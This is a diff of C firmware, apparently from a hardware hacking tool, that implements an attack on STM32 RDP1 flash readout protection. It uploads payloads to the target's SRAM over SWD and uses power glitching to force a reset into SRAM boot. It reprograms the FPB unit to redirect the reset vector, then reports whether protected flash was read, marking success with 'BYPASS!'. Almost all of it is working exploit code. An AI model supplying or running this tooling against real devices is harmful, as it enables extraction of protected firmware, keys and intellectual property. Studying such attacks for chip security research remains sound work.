+    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
+                    val, (val >> 16) & 0xFFFF);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
+                    val, (val >> 24) & 7);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
+                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
+    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
+    if (val & (1 << 27)) uart_cli_send("POR ");
+    if (val & (1 << 28)) uart_cli_send("SW_RST ");
+    if (val & (1 << 29)) uart_cli_send("IWDG ");
+    if (val & (1 << 30)) uart_cli_send("WWDG ");
+    if (val & (1 << 31)) uart_cli_send("LPWR ");
+    uart_cli_send("\r\n");
+
+    RDR_READ_WORD(val);
+    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
+    uint8_t impl = (val >> 24) & 0xFF;
+    uint16_t partno = (val >> 4) & 0xFFF;
+    if (impl == 0x41 && partno == 0xC23)
+        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
+    uart_cli_send("\r\n");
+
+    uart_cli_send("=====================\r\n");
+
+    // Flash read tests
+    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
+    struct {
+        const char *name;
+        uint32_t addr;
+    } flash_tests[] = {
+        {"Flash base     ", 0x08000000},
+        {"Reset vector   ", 0x08000004},
+        {"Option bytes   ", 0x1FFFF800},
+        {"OB USER/nUSER  ", 0x1FFFF802},
+        {"Flash size reg ", 0x1FFFF7E0},
+    };
+
+    for (int t = 0; t < 5; t++) {
+        uint64_t t0 = time_us_64();
+        while (!uart_is_readable(TARGET_UART_ID)) {
+            if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) {
+                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
+                goto rdr_done;
+            }
+        }
+        uint8_t status = uart_getc(TARGET_UART_ID);
+        uint32_t data;
+        RDR_READ_WORD(data);
+
+        if (status == 'O') {
+            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, data);
+        } else if (status == 'F') {
+            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, data);
+        } else {
+            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
+                           flash_tests[t].name, flash_tests[t].addr, status, data);
+        }
+    }
+
+rdr_done:
+    // Check for "DONE"
+    {
+        char done_buf[4] = {0};
+        bool got_done = true;
+        for (int i = 0; i < 4; i++) {
+            uint64_t t0 = time_us_64();
+            while (!uart_is_readable(TARGET_UART_ID)) {
+                if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) { got_done = false; break; }
+            }
+            if (!got_done) break;
+            done_buf[i] = uart_getc(TARGET_UART_ID);
+        }
+        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
+            uart_cli_send("\r\n=== COMPLETE ===\r\n");
+        else
+            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
+    }
+
+    #undef RDR_READ_WORD
+    return true;
+}
+
+void target_power_glitch_regdump(uint32_t max_attempts) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern bool swd_resume(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    if (!sweep_calibrated) {
+        uart_cli_send("ERROR: Run TARGET POWER SWEEP first for calibration\r\n");
+        return;
+    }
+
+    uint32_t sram_base = info->sram_base;
+    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
+    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;
+
+    uart_cli_printf("RDP1 GLITCH REGDUMP: %u byte payload -> 0x%08lX\r\n",
+                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
+    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
+    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);
+
+    // === Step 1: Upload regdump payload to SRAM via SWD ===
+    uart_cli_send("\r\n[1] Uploading regdump payload to SRAM...\r\n");
+    swd_init();
+    if (!swd_connect()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed\r\n");
+        return;
+    }
+    swd_halt();
+
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    swd_resume();
+    swd_deinit();
+
+    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
+    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 1);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 1);
+
+    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
+    float thresh_v = sweep_optimal_thresh;
+    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
+                    thresh_v, max_attempts);
+
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(50);
+
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    adc_power_init();
+    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);
+
+    bool stage1_ok = false;
+    glitch_result_t gr;
+
+    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
+        nrst_irq_arm();
+
+        gpio_set_dir(POWER_PIN2, GPIO_IN);
+        gpio_set_dir(POWER_PIN3, GPIO_IN);
+        gpio_disable_pulls(POWER_PIN2);
+        gpio_disable_pulls(POWER_PIN3);
+
+        adc_select_input(ADC_POWER_CHAN);
+        gr.vmin_raw = 4095;
+        gr.nrst_went_low = false;
+        gr.thresh_reached = true;
+
+        uint64_t t0 = time_us_64();
+        gpio_clr_mask(1u << POWER_PIN1);
+
+        while (true) {
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+            if (val <= thresh) break;
+            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
+        }
+
+        if (gr.thresh_reached) {
+            sleep_us(50);
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+        }
+
+        gpio_set_dir(POWER_PIN2, GPIO_OUT);
+        gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_set_mask(POWER_MASK);
+        gr.glitch_us = (uint32_t)(time_us_64() - t0);
+
+        for (int i = 0; i < 5000; i++) {
+            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
+            sleep_us(10);
+        }
+        nrst_irq_disarm();
+        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;
+
+        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
+        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
+                        attempt, vmin, gr.glitch_us,
+                        gr.nrst_went_low ? "LOW" : "high");
+
+        if (gr.nrst_went_low) {
+            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
+            stage1_ok = true;
+            break;
+        }
+
+        gpio_set_mask(POWER_MASK);
+        sleep_ms(200);
+    }
+
+    gpio_set_mask(POWER_MASK);
+
+    if (!stage1_ok) {
+        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
+        gpio_put(BOOT0_PIN, 0);
+        gpio_put(BOOT1_PIN, 0);
+        return;
+    }
+
+    // Wait for stage 1 to complete (FPB config + STOP/wake + UART report)
+    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
+    sleep_ms(500);
+
+    // === Step 4: Init UART ===
+    uart_cli_send("[4] Initializing UART RX...\r\n");
+    uart_deinit(TARGET_UART_ID);
+    gpio_deinit(TARGET_UART_RX_PIN);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    // === Step 5: Set BOOT0=0, pulse nRST — flash boot with FPB redirect to stage 2 ===
+    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
+    sleep_ms(10);
+
+    while (uart_is_readable(TARGET_UART_ID))
+        uart_getc(TARGET_UART_ID);
+
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_put(reset_pin, 0);
+    sleep_ms(10);
+    gpio_put(reset_pin, 1);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    // === Step 6: Receive regdump results ===
+    uart_cli_send("[6] Receiving register dump...\r\n");
+    receive_regdump_results();
+
+    uart_cli_send("[7] Power cycling target...\r\n");
+    gpio_clr_mask(POWER_MASK);
+    sleep_ms(100);
+    gpio_set_mask(POWER_MASK);
+
+    gpio_put(BOOT0_PIN, 0);
+    gpio_put(BOOT1_PIN, 0);
+}
+
+void target_power_resettest(void) {
+    extern bool swd_connect_under_reset(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    uint32_t sram_base = info->sram_base;
+    uint32_t payload_words = (sizeof(rdp_resettest_payload) + 3) / 4;
+    const uint32_t stage2_thumb_addr = sram_base + 0x3EC + 1;
+
+    uart_cli_printf("RDP1 RESET TEST: %u byte payload -> 0x%08lX\r\n",
+                    (unsigned)sizeof(rdp_resettest_payload), sram_base);
+    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
+
+    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
+    swd_init();
+
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 0);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 0);
+
+    if (!swd_connect_under_reset()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
+        return;
+    }
+    uart_cli_send("    Connected, core halted under reset\r\n");
+
+    uart_cli_send("[2] Clearing BKP_DR1 (phase counter)...\r\n");
+    uint32_t apb1enr;
+    swd_read_mem(0x4002101C, &apb1enr, 1);
+    apb1enr |= 0x18000000;
+    swd_write_mem(0x4002101C, &apb1enr, 1);
+    uint32_t pwr_cr;
+    swd_read_mem(0x40007000, &pwr_cr, 1);
+    pwr_cr |= 0x100;
+    swd_write_mem(0x40007000, &pwr_cr, 1);
+    sleep_ms(5);
+    uint32_t zero = 0;
+    swd_write_mem(0x40006C04, &zero, 1);
+
+    uart_cli_send("[3] Uploading resettest payload to SRAM...\r\n");
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_resettest_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, rdp_resettest_payload, sizeof(rdp_resettest_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    uart_cli_send("[4] Configuring FPB via SWD...\r\n");
+    uint32_t remap_val = stage2_thumb_addr;
+    swd_write_mem(sram_base + 0x20, &remap_val, 1);
+    uint32_t fp_ctrl = 0x03;
+    swd_write_mem(0xE0002000, &fp_ctrl, 1);
+    uint32_t fp_remap = 0x20000020;
+    swd_write_mem(0xE0002004, &fp_remap, 1);
+    uint32_t fp_comp0 = 0x05;
+    swd_write_mem(0xE0002008, &fp_comp0, 1);
+
+    uint32_t verify_val;
+    swd_read_mem(0xE0002000, &verify_val, 1);
+    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
+
+    uint32_t demcr_val = 0;
+    swd_write_mem(0xE000EDFC, &demcr_val, 1);
+
+    uart_cli_send("[5] Running stage 1 (STOP/wake debug kill)...\r\n");
+    uint32_t stage1_addr = sram_base + 0x200 + 1;
+    swd_write_core_reg(13, 0x20005000);
+    swd_write_core_reg(15, stage1_addr);
+
+    uart_deinit(TARGET_UART_ID);
+    gpio_deinit(TARGET_UART_RX_PIN);
+    gpio_init(TARGET_UART_RX_PIN);
+    uart_init(TARGET_UART_ID, 115200);
+    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
+    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
+
+    uint32_t dhcsr_val;
+    dhcsr_val = 0xA05F0003;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0001;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    dhcsr_val = 0xA05F0000;
+    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
+    swd_deinit();
+
+    sleep_ms(200);
+    uart_cli_send("    Stage 1 report: ");
+    int s1_chars = 0;
+    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
+        uint8_t c = uart_getc(TARGET_UART_ID);
+        uart_cli_printf("%02X ", c);
+        s1_chars++;
+    }
+    if (s1_chars == 0) uart_cli_send("(nothing received)");
+    uart_cli_send("\r\n");
+
+    uart_cli_send("[6] Pulsing nRST (flash boot with FPB redirect)...\r\n");
+    while (uart_is_readable(TARGET_UART_ID))
+        uart_getc(TARGET_UART_ID);
+
+    uint8_t reset_pin = 15;
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_OUT);
+    gpio_put(reset_pin, 0);
+    sleep_ms(10);
+    gpio_put(reset_pin, 1);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    uart_cli_send("[7] Receiving test results...\r\n");
+    const char *phase_names[] = {
+        "Baseline + STOP cycling",
+        "Post-IWDG reset",
+        "Post-WWDG reset",
+        "Post-STANDBY wakeup",
+    };
+    /* RCC_CSR bits 24-31: LPWR(24), ?(25), PIN(26), POR(27), SFT(28), IWDG(29), WWDG(30), LPWR2(31) */
+    const char *reset_flag_names[] = {
+        "LPWR", "?25", "PIN", "POR", "SFT", "IWDG", "WWDG", "LPWR2"
+    };
+
+    /* Helper: read one byte with timeout, returns -1 on timeout */
+    #define READ_BYTE(dst, timeout_us) do { \
+        uint64_t _dl = time_us_64() + (timeout_us); \
+        int _got = 0; \
+        while (time_us_64() < _dl) { \
+            if (uart_is_readable(TARGET_UART_ID)) { \
+                (dst) = uart_getc(TARGET_UART_ID); \
+                _got = 1; break; \
+            } \
+        } \
+        if (!_got) { uart_cli_send("  (byte timeout)\r\n"); goto resettest_done; } \
+    } while(0)
+
+    #define READ_WORD(dst, timeout_us) do { \
+        (dst) = 0; \
+        for (int _i = 0; _i < 4; _i++) { \
+            uint8_t _b; READ_BYTE(_b, (timeout_us)); \
+            (dst) |= ((uint32_t)_b) << (_i * 8); \
+        } \
+    } while(0)
+
+    uint64_t total_start = time_us_64();
+    bool done = false;
+
+    while (!done && (time_us_64() - total_start) < 30000000) {
+        /* Wait for "RST1" header */
+        uint8_t hdr_state = 0;
+        const char *hdr_str = "RST1";
+        uint64_t phase_start = time_us_64();
+        bool hdr_found = false;
+
+        while (!hdr_found && (time_us_64() - phase_start) < 5000000) {
+            if (uart_is_readable(TARGET_UART_ID)) {
+                uint8_t c = uart_getc(TARGET_UART_ID);
+                if (c == hdr_str[hdr_state]) {
+                    hdr_state++;
+                    if (hdr_state == 4) hdr_found = true;
+                } else {
+                    hdr_state = (c == 'R') ? 1 : 0;
+                }
+            }
+        }
+
+        if (!hdr_found) {
+            uart_cli_send("    No RST1 header received\r\n");
+            break;
+        }
+
+        uint8_t phase;
+        READ_BYTE(phase, 500000);
+        const char *pname = (phase < 4) ? phase_names[phase] : "Unknown";
+        uart_cli_printf("\r\n=== Phase %u: %s ===\r\n", phase, pname);
+
+        uint32_t rcc_csr;
+        READ_WORD(rcc_csr, 500000);
+        uart_cli_printf("  RCC_CSR: 0x%08lX (", rcc_csr);
+        for (int i = 0; i < 8; i++) {
+            if (rcc_csr & (1u << (24 + i)))
+                uart_cli_printf("%s ", reset_flag_names[i]);
+        }
+        uart_cli_send(")\r\n");
+
+        /* Flash test result: 'O'+data or 'F'+PC */
+        uint8_t status;
+        READ_BYTE(status, 2000000);
+        uint32_t flash_val;
+        READ_WORD(flash_val, 500000);
+
+        if (status == 'O') {
+            uart_cli_printf("  Flash 0x08000000: OK  0x%08lX", flash_val);
+            if (flash_val == 0xCAFEF00D)
+                uart_cli_send(" *** BYPASS! ***");
+            uart_cli_send("\r\n");
+        } else if (status == 'F') {
+            uart_cli_printf("  Flash 0x08000000: FAULT (PC=0x%08lX)\r\n", flash_val);
+        } else {
+            uart_cli_printf("  Flash test: unexpected 0x%02X val=0x%08lX\r\n", status, flash_val);
+        }
+
+        /* Trailer: 'C'=cycling, 'N'=next reset, 'D'=done */
+        uint8_t trailer;
+        READ_BYTE(trailer, 5000000);
+
+        if (trailer == 'C') {
+            uart_cli_send("  STOP cycling...\r\n");
+            /* Wait for 'T' (cycling done) */
+            uint8_t t;
+            READ_BYTE(t, 10000000);
+            if (t == 'T') {
+                /* Post-cycling flash test */
+                READ_BYTE(status, 2000000);
+                READ_WORD(flash_val, 500000);
+                if (status == 'O') {
+                    uart_cli_printf("  Post-STOP flash: OK  0x%08lX", flash_val);
+                    if (flash_val == 0xCAFEF00D)
+                        uart_cli_send(" *** BYPASS! ***");
+                    uart_cli_send("\r\n");
+                } else if (status == 'F') {
+                    uart_cli_printf("  Post-STOP flash: FAULT (PC=0x%08lX)\r\n", flash_val);
+                } else {
+                    uart_cli_printf("  Post-STOP flash: unexpected 0x%02X\r\n", status);
+                }
+                READ_BYTE(trailer, 2000000);
+            } else {
+                uart_cli_printf("  Expected 'T', got 0x%02X\r\n", t);
+                break;
+            }
+        }
+
+        if (trailer == 'N') {
+            uart_cli_send("  -> Next reset...\r\n");
+            sleep_ms(200);
+        } else if (trailer == 'D') {
+            /* Read "ONE" after 'D' */
+            uint8_t o, n, e;
+            READ_BYTE(o, 500000);
+            READ_BYTE(n, 500000);
+            READ_BYTE(e, 500000);
+            uart_cli_send("\r\n=== ALL PHASES COMPLETE ===\r\n");
+            done = true;
+        } else {
+            uart_cli_printf("  Unexpected trailer: 0x%02X\r\n", trailer);
+            break;
+        }
+    }
+
+    if (!done)
+        uart_cli_send("\r\n=== TEST COMPLETE (STANDBY phase lost SRAM — expected) ===\r\n");
+
+    #undef READ_BYTE
+    #undef READ_WORD
+
+resettest_done:
+
+    uart_cli_send("[8] Power cycling target...\r\n");
+    gpio_clr_mask(POWER_MASK);
+    sleep_ms(100);
+    gpio_set_mask(POWER_MASK);
 }
